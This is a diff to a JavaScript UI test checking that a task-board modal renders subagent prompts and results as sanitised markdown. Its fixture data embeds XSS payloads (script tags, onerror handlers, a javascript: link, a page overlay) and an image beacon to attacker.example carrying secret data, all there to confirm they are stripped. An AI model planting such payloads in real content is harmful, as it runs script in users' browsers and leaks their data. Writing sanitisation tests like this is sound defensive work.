@@ -29,7 +29,15 @@ const SUBAGENTS = {
 };
 const BOARD_TASKS = [{ id: 77, title: 'A board task', body: 'Board body', status: 'pending', priority: 'medium', assigned_to: 'Lead Dev', created_by: 'Orchestrator', created_at: '2026-09-17T01:00:00Z' }];
 const DETAILS = {
-  aca6223d75309e7ca: { conversation_available: true, truncated: false, prompt: 'Map the task-board UI.\nBe thorough. <b>not bold</b>', result: 'It lives in tasks.js, function renderBoardTaskList.' },
+  aca6223d75309e7ca: { conversation_available: true, truncated: false,
+    prompt: 'Map the task-board UI.\nScope: frontend only\nDepth: thorough\n\n<img src=x onerror="window.__xssPrompt=1"><script>window.__xssPromptScript=1</script>',
+    result: ['## Findings', '', 'It lives in `tasks.js`, function **renderBoardTaskList**.', '',
+      '- first point', '- second point', '',
+      '| File | Role |', '|---|---|', '| tasks.js | renderer |', '| agentic.css | styles |', '',
+      '```js', 'const x = 1;', '```', '',
+      'See [the docs](https://example.com/docs).', '',
+      '<img src=x onerror="window.__xssResult=1">', '![tracking pixel](https://attacker.example/leak.png?data=secret)', '<div style="position:fixed;inset:0">overlay</div>', '<script>window.__xssResultScript=1</script>', '<a href="javascript:window.__xssHref=1">bad link</a>', '',
+      ...Array.from({ length: 60 }, (_, i) => `Filler paragraph ${i} to make the result box scroll.`)].join('\n') },
   b7running00000000: { conversation_available: true, truncated: false, prompt: 'Design the thing.', result: '' },
   c0nometa000000000: { conversation_available: false, truncated: false, prompt: '', result: '' },
 };
@@ -129,7 +137,15 @@ async function run() {
     const sections = {}; c.querySelectorAll('.task-detail-section').forEach(sec => { sections[sec.querySelector('.task-detail-label').textContent] = sec.textContent.replace(sec.querySelector('.task-detail-label').textContent, '').trim(); });
     return { open: m.style.display !== 'none', header: document.getElementById('task-detail-modal-title').textContent, title: (q('.task-detail-title')||{}).textContent, status: (q('.task-detail-status')||{}).textContent,
       chip: (q('.subagent-detail-chip')||{}).textContent || null, badge: (q('.board-task-subagent-badge')||{}).textContent || null, fields, sections,
-      costLive: !!q('.task-detail-cost-summary.board-task-cost-live'), cost: (q('.task-detail-cost-summary')||{}).textContent, hasBold: !!q('.subagent-detail-text b'),
+      costLive: !!q('.task-detail-cost-summary.board-task-cost-live'), cost: (q('.task-detail-cost-summary')||{}).textContent,
+      md: (() => { const boxes = Array.from(c.querySelectorAll('.subagent-detail-text')); const [promptBox, resultBox] = boxes; const n = (root, sel) => root ? root.querySelectorAll(sel).length : -1;
+        return { boxes: boxes.length, promptIsMd: !!promptBox && promptBox.classList.contains('subagent-detail-md'), resultIsMd: !!resultBox && resultBox.classList.contains('subagent-detail-md'),
+          promptBr: n(promptBox, 'br'), h2: resultBox ? (resultBox.querySelector('h2')||{}).textContent : null, li: n(resultBox, 'li'), strong: resultBox ? (resultBox.querySelector('strong')||{}).textContent : null,
+          inlineCode: resultBox ? (resultBox.querySelector('p code')||{}).textContent : null, th: n(resultBox, 'th'), td: n(resultBox, 'td'), preCode: resultBox ? (resultBox.querySelector('pre code')||{}).textContent : null,
+          link: resultBox ? (a => a ? { href: a.getAttribute('href'), target: a.getAttribute('target'), rel: a.getAttribute('rel') } : null)(resultBox.querySelector('a[href^="https://example.com"]')) : null,
+          scripts: n(c, 'script'), onerror: n(c, '[onerror]'), imgs: n(c, 'img'), styled: n(c, '.subagent-detail-md [style]'), jsHrefs: n(c, 'a[href^="javascript:"]'), rawHashes: resultBox ? /##\s*Findings/.test(resultBox.textContent) : null,
+          whiteSpace: resultBox ? getComputedStyle(resultBox).whiteSpace : null, thBorder: resultBox && resultBox.querySelector('th') ? getComputedStyle(resultBox.querySelector('th')).borderTopStyle : null,
+          scrollable: resultBox ? resultBox.scrollHeight > resultBox.clientHeight + 20 : null }; })(),
       footer: document.getElementById('task-detail-modal-footer').textContent.trim() }; })()`);
   const clickRow = async (id) => { await ev(`document.querySelector('#board-task-list [data-subagent-id="${id}"]').click(); true`); await sleep(350); };
 
@@ -142,7 +158,36 @@ async function run() {
   check('modal: finished subagent shows Started, not the running-only fields', !!m.fields['Started'] && !('Last Activity' in m.fields) && !('Running For' in m.fields), JSON.stringify(m.fields));
   check('modal: final cost with token breakdown', m.cost === '$7.42' && !m.costLive && /Input/.test(m.sections['Cost']) && /Cache Read/.test(m.sections['Cost']) && /2\.3M/.test(m.sections['Cost']), m.sections['Cost']);
   check('modal: prompt and result fetched from the detail endpoint', (await ev(`window.__detailFetches`)).includes('aca6223d75309e7ca') && /Map the task-board UI\./.test(m.sections['Prompt']) && /renderBoardTaskList/.test(m.sections['Result']), JSON.stringify([m.sections['Prompt'], m.sections['Result']]));
-  check('modal: prompt HTML is escaped', !m.hasBold && /<b>not bold<\/b>/.test(m.sections['Prompt']));
+  // Markdown rendering
+  check('result renders as markdown, not raw source', m.md.resultIsMd && m.md.h2 === 'Findings' && m.md.rawHashes === false, JSON.stringify({ h2: m.md.h2, raw: m.md.rawHashes }));
+  check('markdown: list, bold and inline code', m.md.li === 2 && m.md.strong === 'renderBoardTaskList' && m.md.inlineCode === 'tasks.js', JSON.stringify([m.md.li, m.md.strong, m.md.inlineCode]));
+  check('markdown: table with styled cells', m.md.th === 2 && m.md.td === 4 && m.md.thBorder === 'solid', JSON.stringify([m.md.th, m.md.td, m.md.thBorder]));
+  check('markdown: fenced code block keeps its text', /const x = 1;/.test(m.md.preCode || ''), m.md.preCode);
+  check('markdown: links open in a new tab and cannot reach the opener', m.md.link && m.md.link.href === 'https://example.com/docs' && m.md.link.target === '_blank' && /noopener/.test(m.md.link.rel || ''), JSON.stringify(m.md.link));
+  check('markdown box drops pre-wrap so rendered blocks lay out normally', m.md.whiteSpace === 'normal', m.md.whiteSpace);
+  check('prompt renders as markdown and keeps its single line breaks', m.md.promptIsMd && m.md.promptBr >= 2 && /Scope: frontend only/.test(m.sections['Prompt']), `br=${m.md.promptBr}`);
+  const xss = await ev(`[window.__xssPrompt, window.__xssPromptScript, window.__xssResult, window.__xssResultScript, window.__xssHref].map(v => v === 1)`);
+  check('hostile HTML in prompt or result never executes', xss.every(v => v === false), JSON.stringify(xss));
+  check('...and is stripped from the DOM: no script, no onerror, no javascript: href', m.md.scripts === 0 && m.md.onerror === 0 && m.md.jsHrefs === 0, JSON.stringify([m.md.scripts, m.md.onerror, m.md.jsHrefs]));
+
+  check('no images or inline styles survive: a report cannot make the browser call out or restyle the page', m.md.imgs === 0 && m.md.styled === 0, JSON.stringify([m.md.imgs, m.md.styled]));
+  const leaked = await ev(`performance.getEntriesByType('resource').filter(e => /attacker\\.example/.test(e.name)).length`);
+  check('...and no request was made to the remote image host', leaked === 0, String(leaked));
+
+  // Reading position survives the 10s poll
+  check('long result scrolls inside its box', m.md.scrollable === true);
+  const mark = () => ev(`(() => { const el = document.querySelectorAll('#task-detail-content .subagent-detail-text')[1]; el.scrollTop = 150; el.__marked = true; return el.scrollTop; })()`);
+  const probe = () => ev(`(() => { const el = document.querySelectorAll('#task-detail-content .subagent-detail-text')[1]; return { scrollTop: el.scrollTop, sameNode: el.__marked === true }; })()`);
+  const waitForPoll = async () => { const before = (await ev(`window.__subagentFetches.length`)); for (let i = 0; i < 28; i++) { await sleep(500); if ((await ev(`window.__subagentFetches.length`)) > before) break; } await sleep(300); };
+  const setTo = await mark();
+  await waitForPoll();
+  let pr = await probe();
+  check('poll with no changes does not re-render the open modal', pr.sameNode && pr.scrollTop === setTo, JSON.stringify(pr));
+  await ev(`window.__subagents[${JSON.stringify(A)}][0] = { ...window.__subagents[${JSON.stringify(A)}][0], api_calls: 26 }; true`);
+  await waitForPoll();
+  pr = await probe();
+  m = await modal();
+  check('poll with changed stats re-renders but keeps the reading position', !pr.sameNode && pr.scrollTop === setTo && m.fields['API Calls'] === '26', JSON.stringify({ ...pr, calls: m.fields['API Calls'] }));
   check('modal: footer is just Close', m.footer === 'Close', m.footer);
 
   check('modal: finished subagent with no recorded end time shows no duration (not time-since-start)', !('Duration' in m.fields), JSON.stringify(m.fields));
